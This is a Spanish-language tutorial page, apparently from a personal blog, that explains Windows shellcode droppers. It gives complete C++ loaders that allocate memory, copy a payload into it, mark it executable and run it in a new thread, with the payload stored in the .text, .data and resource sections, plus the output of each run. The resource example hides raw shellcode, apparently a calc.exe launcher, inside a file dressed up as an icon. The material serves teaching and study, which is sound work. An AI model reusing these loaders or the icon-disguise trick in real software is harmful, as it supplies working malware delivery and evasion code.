---
layout: default
---


# Droppers de codigo

Dentro de un proceso del sistema operativo se realizará una inyección de código cuando se ejecute un trozo de código a bajo nivel introducido por el desarrollador/hacker.

Dentro de la memoria del proceso, estará definido segun ell siguiente diagrama:



En función de donde se almacene en el codigo funte del binario el shellcode, diferenciaremos entre las secciones:

```
.text
.data
.rsc
```
## Pesudo-codigo básico: Inyección de shellcode en proceso
El diagrama de ejección básica para la inyección de código será la siguiente:
![Code_inyection](/assets/images/Code_inyection_diagram.png)

El pseudo código asociado a la inyección de un payload de forma básica será el siguiente:
```c++
// 1. Se reserva el espacio asociado al payload en memoria dinámica del proceso en ejecución con permisos de lectura y escritura 
exec_mem = VirtualAlloc(..., payload_length,..., PAGE_READWRITE)

// 2. Se copia el shellcode o payload desde el binario de su sección (.text, .data, .rsc) al espacio de memoria reservado
RtlMoveMemory(exec_mem, payload, payload_length)

// 3. Se modifican los permisos del espacio de memoria reservado con privilegios de ejecución 
VirtualProtect(exec_mem, payload_length, PAGE_EXECUTE_READ,...)

// 4. Se crea un nuevo hilo en el proceso local que ejecute el código almacenado en el espacio de memoria reservado
CreateThread(..., exec_mem, ...)
```
En referencia a las funciones asociadas a la inyección de código, es posible identificar los parámetros de entrada y la dll asociada del sistema operativo a la que se invoca en tiempo de ejecución apra la ejecución de la llamada:

### VirtualAlloc()

Esta función, es utilizada para reservar dinámicamente en tiempo de ejecución un espacio de memoria en el contexto de memoria del proceso que la invoca.
Pertenece a la librería kernel32.dll
Los parámetros de entrada serán los siguientes:
```c++
LPVOID VirtualAlloc(
  LPVOID lpAddress,        // Posición en la que se quiere iniciar el espacio reservado de memoria, si es nulo el SO reserva dinámicamente el espacio
  SIZE_T dwSize,           // Tamaño del espacio que se quiere reservar en bytes 
  DWORD  flAllocationType, // Tipo de reserva de memoria que se quiere utilizar: MEM_COMMIT, MEM_RESERVE
  DWORD  flProtect         // Tipo de privilegios que se le quiere dar al espacio de memoria reservado. PAGE_READWRITE, PAGE_EXECUTE_READWRITE, etc.
);
```
Si la función termina de forma satisfactoria, devolvera la posición de memoria en la que comienza el espacio reservado, en caso contrario devolverá NULL. 

### RtlMoveMemory()

Esta función, es utilizada para copiar los bytes de entrada desde una posición de memoria a otra.
Pertenece a la librería ntdll.dll
Los parámetros de entrada serán los siguientes:
```c++
void RtlMoveMemory(
  void *Destination,    // Puntero a la posición de memoria inicial del destino
  const void *Source,   // Puntero a la posición de momoria inicial del origen
  size_t Length         // Logitud de los bytes  que se quieren copiar del origen al destino
);
```
Si la función termina su ejecución de forma satisfactoria, no retornará nada, en caso de error se producirá una excepción en tiempo de ejecución.

### VirtualProtect()

Esta función, es utilizada para modificar los atributos de protección en el espacio de momoria reservado dinámicamente dentro del contexto del proceso en ejecución.
Pertenece a la librería kernel32.dll
Los parámetros de entrada serán los siguientes:

```c++
BOOL VirtualProtect(
  LPVOID lpAddress,      // Posición de momoria inicial a la que se la quiera modificar la protección
  SIZE_T dwSize,         // Longitud  en bytes desde la posición inicial a la ques e le quiere modificar la protección inicial
  DWORD  flNewProtect,   // Nueva propiedad/es de protección solicitadas. PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, etc.
  PDWORD lpflOldProtect  // Puntero a la antigua variable que contenia la protección
);
```
Si la función termina la ejecución de forma satisfactoria devolvera un valor diferente de 0, en caso contrarío devolverá 0.

### CreateThread()

Esta función, es utilizada para la creaciónd eun nuevo hilo en el contexto del proceso actual, para la ejecución del código almacenado en una posición de memoria.
Pertenece a la libraría kernel32.dll
Los parámetros de entrada serán los siguientes:

```c++
HANDLE CreateThread(
  LPSECURITY_ATTRIBUTES   lpThreadAttributes,  // Determina el si tiene herencia o no del proceso hijo del que cualga el hilo que se va a ejecutar.
  SIZE_T                  dwStackSize,         // Tamaño de la pila en memoria en bytes
  LPTHREAD_START_ROUTINE  lpStartAddress,      // Puntero a la dirección de memoria de la función que será ejecutada por el hilo
  LPVOID                  lpParameter,         // Puntero a la posición de memoria de los parámetros de entrada 
  DWORD                   dwCreationFlags,     // Flags de ejecución, despues de creación tiempo de delay,etc
  LPDWORD                 lpThreadId           // Puntero a la variable que almacenará el Identificador del thread que se va a ejecutar
);
```
Si la función termina la ejecución de forma satisfactoria, delvolvera el identificador del hilo, en caso contrario devolverá el valor NULL.

## Inyeccion en .text

Código de ejemplo, el shellcode se almacena dentro de una variable local en el código fuente:
```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	unsigned char payload[] = {
		0x90,		// NOP
		0x90,		// NOP
		0xcc,		// INT3
		0xc3		// RET
	};
	unsigned int payload_len = 4;
	
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("\nSotred payload in .text section: %-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("\n [VirtualAlloc] of new moemory region: %-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
	getchar();
	printf("\n [RtlMoveMemory] copy data \n");
	RtlMoveMemory(exec_mem, payload, payload_len);
	printf("\n [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ \n");
	getchar();
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	printf("\n [CreateThread] Exec stored payload \n");
	getchar();
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}

```
Salida de la ejecución:

```

Sotred payload in .text section: payload addr         : 0x0000008CB73BF820

 [VirtualAlloc] of new moemory region: exec_mem addr        : 0x000001A307D40000


 [RtlMoveMemory] copy data

 [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ


 [CreateThread] Exec stored payload

```
## Inyeccion en .data

Código de ejemplo, el shellcode se almacena dentro de una variable global en el código fuente:
```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char payload[] = {
		0x90,		// NOP
		0x90,		// NOP
		0xcc,		// INT3
		0xc3		// RET
	};
unsigned int payload_len = 4;
	
int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("\nSotred payload in .data section %-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("\n [VirtualAlloc] of new moemory region %-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
	getchar();
	printf(" [RtlMoveMemory] copy data \n");
	RtlMoveMemory(exec_mem, payload, payload_len);
	printf(" [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ \n");
	getchar();
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	printf(" [CreateThread] Exec stored payload \n");
	getchar();
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}

```
Salida de la ejecución:
```
Sotred payload in .data section payload addr         : 0x00007FF63C66D000

 [VirtualAlloc] of new moemory region exec_mem addr        : 0x000002D511870000

 [RtlMoveMemory] copy data
 [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ

 [CreateThread] Exec stored payload

```
## Inyeccion en .rsc

Código de ejemplo, el shellcode se almacena dentro de una librería externa al código fuente:
```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payload;
	unsigned int payload_len;
	printf("\n Extract data from external resource FAVICON_ICO");
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	printf("\n Extract data from external resource %-20s ", res);
	resHandle = LoadResource(NULL, res);
	printf("\n Extract data from external resource %-20s ", resHandle);
	payload = (char *) LockResource(resHandle);
	payload_len = SizeofResource(NULL, res);
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("\nSotred payload in .text section %-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("\n [VirtualAlloc] of new moemory region %-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
	getchar();
	printf(" [RtlMoveMemory] copy data \n");
	RtlMoveMemory(exec_mem, payload, payload_len);
	printf(" [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ \n");
	getchar();
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	printf(" [CreateThread] Exec stored payload \n");
	getchar();
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}
	return 0;
}
	

```
Cabecera recurso externo resource.h:
```c++
#define FAVICON_ICO 100

```
Código recurso externo resource.rc que define el recurso externo al que se quiere acceder en tiempo de ejecución:
```c++
#include "resources.h"

FAVICON_ICO RCDATA calc.ico

```
calc.ico, recurso externo que contiene el shellcode ne format raw:
```c++
üHƒäðèÀ   AQAPRQVH1ÒeH‹R`H‹RH‹R H‹rPH·JJM1ÉH1À¬<a|, AÁÉ
AÁâíRAQH‹R ‹B<HÐ‹€ˆ   H…ÀtgHÐP‹HD‹@ IÐãVHÿÉA‹4ˆHÖM1ÉH1À¬AÁÉ
AÁ8àuñLL$E9ÑuØXD‹@$IÐfA‹HD‹@IÐA‹ˆHÐAXAX^YZAXAYAZHƒì ARÿàXAYZH‹éWÿÿÿ]Hº       H  Aº1‹o‡ÿÕ»ðµ¢VAº¦•½ÿÕHƒÄ(<|
€ûàu»Groj YA‰ÚÿÕcalc.exe 
```
Salida de la ejecución:
```
 Extract data from external resource FAVICON_ICO
 Extract data from external resource ` 
 Extract data from external resource ⁿHâΣ≡Φ└
Sotred payload in .text section payload addr         : 0x00007FF69DF12060

 [VirtualAlloc] of new moemory region exec_mem addr        : 0x00000195C51A0000

 [RtlMoveMemory] copy data
 [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ

 [CreateThread] Exec stored payload
```

![rsc_section_injection](/assets/images/rsc_section_injection.png)
